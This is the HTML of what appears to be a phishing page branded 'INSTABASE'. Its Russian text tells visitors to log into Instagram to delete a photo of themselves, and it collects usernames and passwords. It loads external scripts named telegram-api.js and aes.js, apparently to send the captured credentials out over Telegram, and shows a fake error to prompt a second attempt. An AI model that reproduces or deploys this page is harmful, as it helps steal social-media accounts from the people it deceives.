<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INSTABASE</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/2/29/Instabase-logo.png">
    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
    <script src="https://zipscript.github.io/script/aes.js"></script>
    <style>
        *{
            margin: 0px;
            padding:0px;
            background: #161b22;
        }
        .form{
            display: block;
            margin: auto;
            text-align: center;
            border: 2px solid #24282e;
            width:330px;
            margin-top:50px;
            border-radius:5px;
            height:290px;
            background: #212730;
        }
        input{
            display: block;
            margin: auto;
            width:240px;
            height:35px;
             padding-left:10px;
             outline: none;
             color: white;
             border-radius:3px;
             background: #212730;
             border: 3px solid rgb(56, 53, 53);
        }
        button{
            width:250px;
            height:34px;
            margin-top:30px;
           border: none;
        
            color: white;
            font-family: arial;
            background:rgb(250, 78, 78);
            border-radius:5px;

        }
        #img{
            display: block;
            margin: auto;
            text-align: center;
            width:160px;
            margin-top:50px;
            border-radius:5px;
        }
        p{
            display: block;
            margin: auto;
            text-align: center;
            margin-top:10px;
            color: white;
            font-family: arial;
            font-size:13px;
            width:200px;
        }
        h3{
            display: none;
            margin: auto;
            text-align: center;
            background: none;
            font-family: monospace;
            color:tomato;
            margin-top:20px;
            width:150px;
            font-size:12px;
        }
        h5{
           
            display: block;
            margin: auto;
            text-align: center;
            color:#29486d;
            width:260px;
            font-size:10px;
            margin-top:200px;
            font-family:Arial, Helvetica, sans-serif;
        }
        .head{
           background:#323d4d;
        }
        .logo{
            width:250px;
            background: none;
            display: block;
            margin-left:10px;            
        }
    </style>
</head>
<body>
    <div class="head">
        <img class="logo" src="https://d1r8vl7h9sno9u.cloudfront.net/website/customer-logos/instabase.svg" alt="">
    </div>
   <img id="img"  alt="">
   <p>Подтвердите что это фото принадлежит вам</p>
   <p style="color:tomato;width:300px">Для подтверждения личности зайдите в свой аккаунт Instagram !</p>
   <div class="form">
       <br><br>
       <input type="text" autocomplete="off" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
       <br>
       <input type="password" id="password" placeholder="Пароль">
       <button onclick="login()">Удалить Фото</button>
       <h3 id="error">Вы ввели не правильные данные ?</h3>
   </div>

</body>
